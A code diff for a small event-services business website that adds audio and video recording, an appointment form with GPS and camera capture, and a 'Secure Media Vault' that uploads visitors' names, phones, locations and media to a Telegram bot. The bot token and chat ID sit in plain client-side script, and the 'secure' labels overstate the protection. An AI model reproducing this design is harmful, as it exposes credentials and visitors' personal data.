+        const user = await checkUser(); if(!user) return;
+        const btn = document.getElementById('btnVoice'); 
+        const stopBtn = document.getElementById('stopRecordBtn');
+        const status = document.getElementById('recordingStatus');
+        
+        try {
+            currentStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(currentStream); mediaRecorder.start(); audioChunks = [];
+            btn.style.display = 'none'; document.getElementById('btnVideo').style.display = 'none'; document.getElementById('btnFlipCam').style.display = 'none';
+            stopBtn.style.display = 'block'; 
+            status.style.display = 'block'; status.innerText = 'Capturing Audio...';
+            
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                sendSecure(new Blob(audioChunks, {type:'audio/mpeg'}), 'voice', user.n, user.p);
+                resetRecordButtons();
+            };
+        } catch(e) { alert("Mic denied."); }
+    }
+
+    async function startVideoRecord() {
+        const user = await checkUser(); if(!user) return;
+        const btn = document.getElementById('btnVideo'); 
+        const stopBtn = document.getElementById('stopRecordBtn');
+        const status = document.getElementById('recordingStatus'); 
+        const vid = document.getElementById('cameraPreview');
+        
+        try {
+            currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: true });
+            vid.srcObject = currentStream; vid.style.display = 'block';
+            
+            mediaRecorder = new MediaRecorder(currentStream); mediaRecorder.start(); audioChunks = [];
+            
+            document.getElementById('btnVoice').style.display = 'none'; btn.style.display = 'none'; document.getElementById('btnFlipCam').style.display = 'none';
+            stopBtn.style.display = 'block';
+            status.style.display = 'block'; status.innerText = 'Capturing Video (50s limit)...';
+            
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                sendSecure(new Blob(audioChunks, {type:'video/mp4'}), 'video', user.n, user.p);
+                currentStream.getTracks().forEach(t => t.stop()); vid.style.display = 'none';
+                resetRecordButtons();
+            };
+            
+            // 50 SECOND TIMEOUT AS REQUESTED
+            setTimeout(() => { if(mediaRecorder.state === "recording") { mediaRecorder.stop(); } }, 50000);
+        } catch(e) { alert("Camera denied."); }
+    }
+
+    function stopMediaRecording() {
+        if(mediaRecorder && mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+        }
+    }
+
+    function resetRecordButtons() {
+        document.getElementById('btnVoice').style.display = 'block';
+        document.getElementById('btnVideo').style.display = 'block';
+        document.getElementById('btnFlipCam').style.display = 'block';
+        document.getElementById('stopRecordBtn').style.display = 'none';
+    }
+
+    function sendSecure(blob, type, name, num) {
+        document.getElementById('recordingStatus').innerText = 'Uploading to Secure Vault...';
+        const fd = new FormData(); fd.append('chat_id', TG_CHAT); fd.append('caption', `🔔 *${type.toUpperCase()} VAULT*\n👤 ${name}\n📞 ${num}`);
+        fd.append(type, blob, `media.${type==='voice'?'mp3':'mp4'}`);
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/${type==='voice'?'sendVoice':'sendVideo'}`, { method:'POST', body:fd })
+        .then(() => { alert(`✅ ${type} Transfer Complete!`); document.getElementById('recordingStatus').style.display='none'; })
+        .catch(() => { alert("⚠️ Transfer Failed."); document.getElementById('recordingStatus').style.display='none'; });
+    }
+</script> 
+      <a href="javascript:void(0)" class="side-link" onclick="toggleMenu(); openGalleryModal()">
+    <i class="fas fa-camera-retro"></i> Live Gallery
+</a>
+
+<div id="galleryModalOverlay" class="mn-gallery-modal-overlay">
+    <div class="mn-gallery-modal-content">
+        <span class="mn-gallery-close-btn" onclick="closeGalleryModal()">&times;</span>
+        <h2 class="mn-gallery-title">Live Gallery</h2>
+        
+        <div class="mn-gallery-scroll-box">
+            <img src="https://i.postimg.cc/R0smYWFp/2025-10-07-(5).jpg" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/Pf8H6rkd/2025-10-10-(1).png" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/Mp9mfwHd/2025-10-09.jpg" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/5N3wDJB1/2025-10-10.png" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/g0RrFyC3/2025-10-07.jpg" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/3JHsnX1r/2025-10-07-(6).jpg" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/3xxbcnv3/2025-10-07-(10).jpg" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/Vv7kBKCH/2025-10-07-(1).jpg" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/W38NT5X0/2025-10-07-(2).jpg" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/N0VVTmFm/2025-10-07-(8).jpg" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/pXpWMY8f/2025-10-07.png" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/9XySR4hN/2025-10-07-(9).jpg" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/kMhCs6ZG/2025-10-07-(3).jpg" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/Pr8gM6Yz/2025-10-07-(4).jpg" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/FFfr2V0k/2025-10-07-(1).png" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+            <img src="https://i.postimg.cc/k5k1DChn/2025-10-07-(2).png" alt="Maa Nirmala Setup" class="mn-full-size-img" loading="lazy">
+        </div>
+    </div>
+</div>
+
+<style>
+    /* Dark Blurred Background Overlay */
+    .mn-gallery-modal-overlay {
+        display: none; 
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(3, 3, 5, 0.95); 
+        backdrop-filter: blur(12px);
+        z-index: 999999; 
+        justify-content: center;
+        align-items: center;
+    }
+
+    /* The Main Gallery Window */
+    .mn-gallery-modal-content {
+        background: #0a0a0c; 
+        border: 2px solid #D4AF37; /* Royal Gold Border */
+        border-radius: 16px;
+        width: 95%;
+        max-width: 700px;
+        height: 85vh; /* Takes up 85% of the screen height */
+        padding: 20px 10px 20px 20px;
+        display: flex;
+        flex-direction: column;
+        position: relative;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.9), inset 0 0 30px rgba(212, 175, 55, 0.1);
+        animation: galleryPopIn 0.4s cubic-bezier(0.25, 0.8, 0.25, 1) forwards;
+    }
+
+    @keyframes galleryPopIn {
+        from { opacity: 0; transform: scale(0.95) translateY(20px); }
+        to { opacity: 1; transform: scale(1) translateY(0); }
+    }
+
+    /* Title & Close Button */
+    .mn-gallery-title {
+        font-family: 'Cinzel', serif;
+        color: #D4AF37;
+        text-align: center;
+        margin: 0 0 15px 0;
+        font-size: 24px;
+        font-weight: 800;
+        letter-spacing: 2px;
+        text-transform: uppercase;
+        border-bottom: 1px solid rgba(212, 175, 55, 0.3);
+        padding-bottom: 15px;
+    }
+
+    .mn-gallery-close-btn {
+        position: absolute;
+        top: 15px;
+        right: 20px;
+        color: #D4AF37;
+        font-size: 35px;
+        line-height: 1;
+        cursor: pointer;
+        z-index: 10;
+        transition: color 0.3s ease;
+    }
+    .mn-gallery-close-btn:hover { color: #ffffff; }
+
+    /* Scrollable Image Area */
+    .mn-gallery-scroll-box {
+        overflow-y: auto;
+        flex-grow: 1;
+        padding-right: 15px;
+        display: flex;
+        flex-direction: column;
+        gap: 25px; /* Perfect spacing between images */
+    }
+
+    /* Custom Premium Gold Scrollbar */
+    .mn-gallery-scroll-box::-webkit-scrollbar {
+        width: 6px;
+    }
+    .mn-gallery-scroll-box::-webkit-scrollbar-track {
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 10px;
+    }
+    .mn-gallery-scroll-box::-webkit-scrollbar-thumb {
+        background: #D4AF37;
+        border-radius: 10px;
+    }
+
+    /* Full Size Images */
+    .mn-full-size-img {
+        width: 100%;
+        height: auto;
+        border-radius: 12px;
+        border: 1px solid rgba(212, 175, 55, 0.4);
+        box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+        object-fit: cover;
+    }
+</style>
+
+<script>
+    function openGalleryModal() {
+        document.getElementById('galleryModalOverlay').style.display = 'flex';
+    }
+
+    function closeGalleryModal() {
+        document.getElementById('galleryModalOverlay').style.display = 'none';
+    }
+
+    // Close the gallery if the user clicks outside the window on the dark background
+    window.addEventListener('click', function(event) {
+        let galleryModal = document.getElementById('galleryModalOverlay');
+        if (event.target === galleryModal) {
+            galleryModal.style.display = "none";
+        }
+    });
+</script>
+<a href="javascript:void(0)" class="side-link" style="display: flex; align-items: center; gap: 10px; width: 100%; padding: 15px; background: transparent; border: 1px solid #D4AF37; border-radius: 8px; color: #D4AF37; font-family: 'Outfit', sans-serif; font-weight: bold; font-size: 16px; text-decoration: none; justify-content: center; box-sizing: border-box; transition: 0.3s ease; margin-bottom: 15px;" onclick="toggleMenu(); openAppointmentModal()">
+    <i class="fas fa-calendar-check"></i> SCHEDULE APPOINTMENT
+</a>
+
+<div id="appointmentModalOverlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(5,5,5,0.95); z-index:9999999; justify-content:center; align-items:center; backdrop-filter: blur(10px);">
+    <div class="mn-master-box" style="width:95%; max-width:550px; height:90vh; border:1px solid #D4AF37; border-radius:16px; background:linear-gradient(145deg, #110e08 0%, #050505 100%); display:flex; flex-direction:column; box-shadow: 0 20px 50px rgba(0,0,0,0.9);">
+        
+        <div class="master-header" style="padding:20px; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); position:relative;">
+            <span onclick="closeAppointmentModal()" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">×</span>
+            <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:22px; font-weight:900;"><i class="fas fa-calendar-alt"></i> New Appointment</h2>
+        </div>
+
+        <div style="flex-grow:1; overflow-y:auto; padding:20px; box-sizing:border-box;" id="aptFormContainer">
+            
+            <div style="display:flex; gap:10px; margin-bottom: 15px;">
+                <div class="f-group" style="flex:1;">
+                    <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:5px; font-size:13px;">Full Name *</span>
+                    <input type="text" id="aptName" class="mn-input" style="width: 100%; box-sizing: border-box;" placeholder="Customer's name">
+                </div>
+                <div class="f-group" style="flex:1;">
+                    <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:5px; font-size:13px;">Mobile Number *</span>
+                    <input type="tel" id="aptPhone" class="mn-input" style="width: 100%; box-sizing: border-box;" placeholder="Contact number">
+                </div>
+            </div>
+
+            <div style="display:flex; gap:10px; margin-bottom: 15px;">
+                <div class="f-group" style="flex:1;">
+                    <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:5px; font-size:13px;">Date of Appointment *</span>
+                    <input type="date" id="aptDate" class="mn-input" style="width: 100%; box-sizing: border-box; color:#fff;">
+                </div>
+                <div class="f-group" style="flex:1;">
+                    <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:5px; font-size:13px;">Exact Time *</span>
+                    <input type="time" id="aptTime" class="mn-input" style="width: 100%; box-sizing: border-box; color:#fff;">
+                </div>
+            </div>
+
+            <div style="display:flex; gap:10px; margin-bottom: 15px;">
+                <div class="f-group" style="flex:1;">
+                    <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:5px; font-size:13px;">Service Type *</span>
+                    <select id="aptService" class="mn-input" style="width: 100%; box-sizing: border-box; color:#fff;">
+                        <option value="" disabled selected>Select Service</option>
+                        <option value="DJ Setup Only">DJ Setup Only</option>
+                        <option value="Tent House Only">Tent House Only</option>
+                        <option value="Lighting & Decor">Lighting & Decor</option>
+                        <option value="Full Package (DJ+Tent+Light)">Full Package</option>
+                    </select>
+                </div>
+                <div class="f-group" style="flex:1;">
+                    <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:5px; font-size:13px;">Event Type *</span>
+                    <select id="aptEvent" class="mn-input" style="width: 100%; box-sizing: border-box; color:#fff;">
+                        <option value="" disabled selected>Select Event</option>
+                        <option value="Wedding">Wedding</option>
+                        <option value="Birthday Party">Birthday Party</option>
+                        <option value="School Event">School Event</option>
+                        <option value="Party / Celebration">Party / Celebration</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="f-group" style="margin-bottom: 15px;">
+                <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:5px; font-size:13px;">Address / Location *</span>
+                <textarea id="aptAddress" class="mn-input" style="width: 100%; box-sizing: border-box; resize:vertical;" rows="2" placeholder="Where the service will take place"></textarea>
+            </div>
+
+            <div style="display:flex; gap:10px; margin-bottom: 15px;">
+                <div class="f-group" style="flex:1;">
+                    <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:5px; font-size:13px;">Number of Guests</span>
+                    <input type="number" id="aptGuests" class="mn-input" style="width: 100%; box-sizing: border-box;" placeholder="Approx people">
+                </div>
+                <div class="f-group" style="flex:1;">
+                    <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:5px; font-size:13px;">Advance Payment</span>
+                    <select id="aptPayment" class="mn-input" style="width: 100%; box-sizing: border-box; color:#fff;">
+                        <option value="Not Paid" selected>Not Paid</option>
+                        <option value="Paid">Paid</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="f-group" style="margin-bottom: 15px;">
+                <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:5px; font-size:13px;">Special Requirements</span>
+                <textarea id="aptReq" class="mn-input" style="width: 100%; box-sizing: border-box; resize:vertical;" rows="2" placeholder="Extra lights, stage, generator, etc."></textarea>
+            </div>
+
+            <div class="f-group" style="margin-bottom: 15px; background:rgba(255,255,255,0.05); padding:15px; border-radius:10px; border:1px dashed rgba(212,175,55,0.4);">
+                <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:10px; font-size:13px;"><i class="fas fa-map-marker-alt"></i> Share Live Location (Manual)</span>
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <button class="mn-btn" style="background:#444; color:#fff; font-size:12px; padding:8px 12px;" onclick="getAptLocation()"><i class="fas fa-location-arrow"></i> Attach Location</button>
+                    <span id="aptLocStatus" style="color:#aaa; font-size:12px;">Not attached</span>
+                </div>
+            </div>
+
+            <div class="f-group" style="margin-bottom: 15px; background:rgba(255,255,255,0.05); padding:15px; border-radius:10px; border:1px dashed rgba(212,175,55,0.4);">
+                <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:10px; font-size:13px;"><i class="fas fa-camera"></i> Capture Live Photo (Optional)</span>
+                
+                <div id="aptCamArea" style="display:none; flex-direction:column; align-items:center; margin-bottom:10px;">
+                    <video id="aptVideo" autoplay playsinline style="width:100%; max-height:200px; object-fit:cover; border-radius:8px; border:2px solid #D4AF37;"></video>
+                    <button class="mn-btn" style="background:#ff3333; color:#fff; margin-top:10px; width:100%;" onclick="captureAptPhoto()"><i class="fas fa-circle"></i> SNAP PHOTO</button>
+                </div>
+                
+                <div id="aptPreviewArea" style="display:none; flex-direction:column; align-items:center; margin-bottom:10px;">
+                    <img id="aptImagePreview" style="width:100%; max-height:200px; object-fit:cover; border-radius:8px; border:2px solid #00fa9a;">
+                    <button class="mn-btn" style="background:#444; color:#fff; margin-top:10px; font-size:12px;" onclick="retakeAptPhoto()"><i class="fas fa-redo"></i> Retake</button>
+                </div>
+
+                <button id="startAptCamBtn" class="mn-btn" style="background:#2575fc; color:#fff; width:100%;" onclick="startAptCamera()"><i class="fas fa-camera"></i> Open Camera</button>
+                <canvas id="aptCanvas" style="display:none;"></canvas>
+            </div>
+
+            <div class="f-group" style="margin-bottom: 25px;">
+                <span class="f-label" style="color:#D4AF37; display:block; margin-bottom:5px; font-size:13px;"><i class="fas fa-paperclip"></i> Or Attach Media (Audio/Video/Photo)</span>
+                <input type="file" id="aptFile" class="mn-input" style="width: 100%; box-sizing: border-box; padding:8px;" accept="image/*,video/*,audio/*">
+            </div>
+
+            <button id="aptSubmitBtn" class="mn-btn" style="width:100%; padding:15px; font-size:18px; background:transparent; border:1px solid #D4AF37; color:#D4AF37; border-radius:8px; cursor:pointer; font-weight:bold;" onclick="submitAppointment()">
+                <i class="fas fa-paper-plane"></i> CONFIRM APPOINTMENT
+            </button>
+            
+            <div id="aptSubmitStatus" style="color:#00fa9a; font-weight:bold; font-size:14px; margin-top:15px; display:none; text-align:center;"></div>
+
+        </div>
+    </div>
+</div>
+
+<script>
+    // --- TELEGRAM CONFIGURATION ---
+    const APT_TG_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ";
+    const APT_TG_CHAT = "8506290708";
+    
+    // --- STATE VARIABLES ---
+    let aptLocationData = "Not Provided";
+    let aptCapturedBlob = null;
+    let aptVideoStream = null;
+
+    // --- MODAL CONTROLS ---
+    function openAppointmentModal() {
+        document.getElementById('appointmentModalOverlay').style.display = 'flex';
+    }
+
+    function closeAppointmentModal() {
+        document.getElementById('appointmentModalOverlay').style.display = 'none';
+        stopAptCamera(); // Ensure camera turns off when closed
+    }
+
+    // --- LOCATION FETCHING (PERFECTED GOOGLE MAPS URL) ---
+    function getAptLocation() {
+        const statusSpan = document.getElementById('aptLocStatus');
+        statusSpan.style.color = "#ff8c00";
+        statusSpan.innerText = "Fetching GPS...";
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                // Perfect Google Maps Link Format:
+                aptLocationData = `[View on Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
+                statusSpan.style.color = "#00fa9a";
+                statusSpan.innerHTML = '<i class="fas fa-check-circle"></i> Location Attached';
+            }, (error) => {
+                statusSpan.style.color = "#ff3333";
+                statusSpan.innerText = "GPS Access Denied/Failed";
+            });
+        } else {
+            statusSpan.innerText = "GPS Not Supported";
+        }
+    }
+
+    // --- CAMERA & PHOTO CAPTURE LOGIC ---
+    async function startAptCamera() {
+        const video = document.getElementById('aptVideo');
+        const camArea = document.getElementById('aptCamArea');
+        const startBtn = document.getElementById('startAptCamBtn');
+        const previewArea = document.getElementById('aptPreviewArea');
+
+        previewArea.style.display = 'none';
+        aptCapturedBlob = null;
+
+        try {
+            aptVideoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+            video.srcObject = aptVideoStream;
+            camArea.style.display = 'flex';
+            startBtn.style.display = 'none';
+        } catch (err) {
+            alert("Camera access denied or unavailable.");
+        }
+    }
+
+    function captureAptPhoto() {
+        const video = document.getElementById('aptVideo');
+        const canvas = document.getElementById('aptCanvas');
+        const imgPreview = document.getElementById('aptImagePreview');
+        const camArea = document.getElementById('aptCamArea');
+        const previewArea = document.getElementById('aptPreviewArea');
+
+        // Set canvas size to video frame
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        // Draw frame to canvas
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Convert to blob
+        canvas.toBlob((blob) => {
+            aptCapturedBlob = blob;
+            const url = URL.createObjectURL(blob);
+            imgPreview.src = url;
+            
+            // Switch UI
+            stopAptCamera();
+            camArea.style.display = 'none';
+            previewArea.style.display = 'flex';
+        }, 'image/jpeg', 0.9);
+    }
+
+    function retakeAptPhoto() {
+        startAptCamera();
+    }
+
+    function stopAptCamera() {
+        if (aptVideoStream) {
+            aptVideoStream.getTracks().forEach(track => track.stop());
+            aptVideoStream = null;
+        }
+    }
+
+    // --- FORM SUBMISSION & TELEGRAM UPLOAD ---
+    function submitAppointment() {
+        // 1. Gather all fields
+        const name = document.getElementById('aptName').value.trim();
+        const phone = document.getElementById('aptPhone').value.trim();
+        const date = document.getElementById('aptDate').value;
+        const time = document.getElementById('aptTime').value;
+        const service = document.getElementById('aptService').value;
+        const eventType = document.getElementById('aptEvent').value;
+        const address = document.getElementById('aptAddress').value.trim();
+        const guests = document.getElementById('aptGuests').value.trim() || "N/A";
+        const payment = document.getElementById('aptPayment').value;
+        const reqs = document.getElementById('aptReq').value.trim() || "None";
+        const fileInput = document.getElementById('aptFile');
+
+        // 2. Validate mandatory fields
+        if (!name || !phone || !date || !time || !service || !eventType || !address) {
+            alert("⚠️ Please fill in all mandatory (*) fields.");
+            return;
+        }
+
+        // 3. UI Loading State
+        const btn = document.getElementById('aptSubmitBtn');
+        const status = document.getElementById('aptSubmitStatus');
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SECURELY TRANSMITTING...';
+        btn.disabled = true;
+        btn.style.opacity = '0.7';
+
+        // 4. Construct the beautiful Telegram Message
+        const captionMsg = `📅 *NEW APPOINTMENT* 📅\n\n👤 *Customer:* ${name}\n📞 *Phone:* ${phone}\n🗓️ *Date & Time:* ${date} at ${time}\n🎪 *Service:* ${service}\n🎉 *Event:* ${eventType}\n👥 *Guests:* ${guests}\n💰 *Payment Status:* ${payment}\n🏠 *Address:* ${address}\n📍 *Live GPS:* ${aptLocationData}\n💡 *Requirements:* ${reqs}`;
+
+        // 5. Build FormData for File Uploads
+        const formData = new FormData();
+        formData.append('chat_id', APT_TG_CHAT);
+        formData.append('caption', captionMsg);
+        formData.append('parse_mode', 'Markdown');
+
+        let endpoint = 'sendMessage';
+
+        // Check if there's an explicitly uploaded file
+        if (fileInput.files.length > 0) {
+            const file = fileInput.files[0];
+            endpoint = 'sendDocument';
+            if(file.type.startsWith('video/')) endpoint = 'sendVideo';
+            if(file.type.startsWith('audio/')) endpoint = 'sendAudio';
+            formData.append(endpoint === 'sendDocument' ? 'document' : (endpoint === 'sendVideo' ? 'video' : 'audio'), file);
+        } 
+        // Or if they captured a live photo
+        else if (aptCapturedBlob) {
+            endpoint = 'sendPhoto';
+            formData.append('photo', aptCapturedBlob, 'live_capture.jpg');
+        } 
+        // If neither, just send as text message
+        else {
+            formData.append('text', captionMsg);
+        }
+
+        // 6. Execute Background Fetch to Telegram
+        fetch(`https://api.telegram.org/bot${APT_TG_TOKEN}/${endpoint}`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // Success UI Reset
+                btn.style.display = 'none';
+                status.style.display = 'block';
+                status.innerHTML = '<i class="fas fa-check-double"></i> APPOINTMENT REQUEST SENT!';
+                
+                // Clear form after 3 seconds and close modal
+                setTimeout(() => {
+                    closeAppointmentModal();
+                    // Clear inputs
+                    document.querySelectorAll('#aptFormContainer input, #aptFormContainer textarea, #aptFormContainer select').forEach(el => el.value = '');
+                    document.getElementById('aptPayment').value = 'Not Paid';
+                    
+                    document.getElementById('aptLocStatus').innerText = 'Not attached';
+                    document.getElementById('aptLocStatus').style.color = '#aaa';
+                    aptLocationData = "Not Provided";
+                    document.getElementById('aptPreviewArea').style.display = 'none';
+                    document.getElementById('startAptCamBtn').style.display = 'block';
+                    aptCapturedBlob = null;
+                    
+                    btn.style.display = 'block';
+                    btn.innerHTML = '<i class="fas fa-paper-plane"></i> CONFIRM APPOINTMENT';
+                    btn.disabled = false;
+                    btn.style.opacity = '1';
+                    status.style.display = 'none';
+                }, 3000);
+            } else {
+                throw new Error("Telegram API Error");
+            }
+        })
+        .catch(error => {
+            alert("⚠️ Transmission failed. File might be too large or connection dropped.");
+            btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SUBMISSION';
+            btn.disabled = false;
+            btn.style.opacity = '1';
+        });
+    }
+</script>
+<a href="javascript:void(0)" class="side-link" onclick="toggleMenu(); openMediaVault()">
+    <i class="fas fa-cloud-upload-alt"></i> Send Media & Files
+</a>
+
+<div id="mediaVaultOverlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#050505; z-index:9999999; flex-direction:column; overflow:hidden;">
+    
+    <div style="padding:20px; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); background:rgba(10,10,10,0.9); position:relative;">
+        <span onclick="closeMediaVault()" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">×</span>
+        <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:22px; font-weight:900;"><i class="fas fa-shield-alt"></i> Secure Media Vault</h2>
+        <p style="margin:5px 0 0 0; color:#aaa; font-family:'Outfit'; font-size:12px;">Direct Transfer to Management</p>
+    </div>
+
+    <div style="flex-grow:1; overflow-y:auto; padding:20px; box-sizing:border-box;">
+        
+        <div style="background:rgba(255,255,255,0.03); border:1px solid rgba(212,175,55,0.2); border-radius:12px; padding:20px; margin-bottom:25px;">
+            <h3 style="color:#D4AF37; font-family:'Cinzel'; font-size:16px; margin:0 0 15px 0;"><i class="fas fa-user-check"></i> 1. Your Details (Required)</h3>
+            <input type="text" id="vaultSenderName" class="mn-input" style="width:100%; box-sizing:border-box; margin-bottom:15px;" placeholder="Your Full Name *">
+            <input type="tel" id="vaultSenderPhone" class="mn-input" style="width:100%; box-sizing:border-box;" placeholder="Your Mobile Number *">
+        </div>
+
+        <h3 style="color:#D4AF37; font-family:'Cinzel'; font-size:16px; margin:0 0 15px 0; text-align:center;"><i class="fas fa-th-large"></i> 2. Select What To Send</h3>
+        
+        <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
+            <div class="media-action-card" onclick="triggerVaultUpload('image')">
+                <i class="fas fa-image" style="color:#00fa9a;"></i>
+                <span>Send Photo</span>
+            </div>
+            <div class="media-action-card" onclick="triggerVaultUpload('video')">
+                <i class="fas fa-video" style="color:#ff3333;"></i>
+                <span>Send Video</span>
+            </div>
+            <div class="media-action-card" onclick="triggerVaultUpload('audio')">
+                <i class="fas fa-music" style="color:#00bfff;"></i>
+                <span>Send Audio</span>
+            </div>
+            <div class="media-action-card" onclick="triggerVaultUpload('document')">
+                <i class="fas fa-file-pdf" style="color:#ff8c00;"></i>
+                <span>Send File / PDF</span>
+            </div>
+        </div>
+
+        <div class="media-action-card full-width-card" onclick="openContactSender()">
+            <i class="fas fa-address-book" style="color:#D4AF37;"></i>
+            <span>Share a Contact Number</span>
+        </div>
+
+        <div id="vaultUploadStatus" style="display:none; margin-top:20px; padding:15px; background:rgba(0,250,154,0.1); border:1px solid #00fa9a; border-radius:10px; text-align:center; color:#00fa9a; font-family:'Outfit'; font-weight:bold;">
+            <i class="fas fa-spinner fa-spin"></i> Uploading to Secure Vault... Please wait.
+        </div>
+
+        <div id="vaultContactForm" style="display:none; margin-top:20px; background:rgba(255,255,255,0.03); border:1px solid #D4AF37; border-radius:12px; padding:20px;">
+            <h4 style="color:#D4AF37; margin:0 0 10px 0;"><i class="fas fa-user-plus"></i> Contact Details to Share</h4>
+            <input type="text" id="shareContactName" class="mn-input" style="width:100%; box-sizing:border-box; margin-bottom:10px;" placeholder="Name of Person">
+            <input type="tel" id="shareContactPhone" class="mn-input" style="width:100%; box-sizing:border-box; margin-bottom:15px;" placeholder="Phone Number">
+            <button class="mn-btn" style="width:100%; background:#D4AF37; color:#000; font-weight:bold;" onclick="sendContactToVault()">SEND CONTACT NOW</button>
+        </div>
+
+    </div>
+
+    <input type="file" id="vaultInputImage" style="display:none;" accept="image/*" onchange="processVaultUpload(this, 'photo')">
+    <input type="file" id="vaultInputVideo" style="display:none;" accept="video/*" onchange="processVaultUpload(this, 'video')">
+    <input type="file" id="vaultInputAudio" style="display:none;" accept="audio/*" onchange="processVaultUpload(this, 'audio')">
+    <input type="file" id="vaultInputDocument" style="display:none;" accept=".pdf,.doc,.docx,.xls,.xlsx,.txt,.zip" onchange="processVaultUpload(this, 'document')">
+</div>
+
+<style>
+    .media-action-card {
+        background: rgba(255,255,255,0.05);
+        border: 1px solid rgba(212,175,55,0.3);
+        border-radius: 12px;
+        padding: 20px 10px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        cursor: pointer;
+        transition: 0.3s ease;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+    }
+    .media-action-card:hover {
+        background: rgba(212,175,55,0.1);
+        border-color: #D4AF37;
+        transform: translateY(-3px);
+    }
+    .media-action-card i {
+        font-size: 32px;
+    }
+    .media-action-card span {
+        color: #fff;
+        font-family: 'Outfit', sans-serif;
+        font-size: 14px;
+        font-weight: 600;
+        text-align: center;
+    }
+    .full-width-card {
+        grid-column: span 2;
+        flex-direction: row;
+        padding: 15px;
+    }
+    .full-width-card i {
+        font-size: 24px;
+    }
+</style>
+
+<script>
+    const VAULT_TG_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ";
+    const VAULT_TG_CHAT = "8506290708";
+
+    function openMediaVault() {
+        document.getElementById('mediaVaultOverlay').style.display = 'flex';
+    }
+
+    function closeMediaVault() {
+        document.getElementById('mediaVaultOverlay').style.display = 'none';
+        document.getElementById('vaultUploadStatus').style.display = 'none';
+        document.getElementById('vaultContactForm').style.display = 'none';
+    }
+
+    // Checks if user filled out their name and phone before allowing upload
+    function validateVaultUser() {
+        const name = document.getElementById('vaultSenderName').value.trim();
+        const phone = document.getElementById('vaultSenderPhone').value.trim();
+        if(!name || !phone) {
+            alert("⚠️ Please enter Your Name and Mobile Number at the top first!");
+            return false;
+        }
+        return { name, phone };
+    }
+
+    // Triggers the specific hidden file input
+    function triggerVaultUpload(type) {
+        if(!validateVaultUser()) return;
+        
+        if(type === 'image') document.getElementById('vaultInputImage').click();
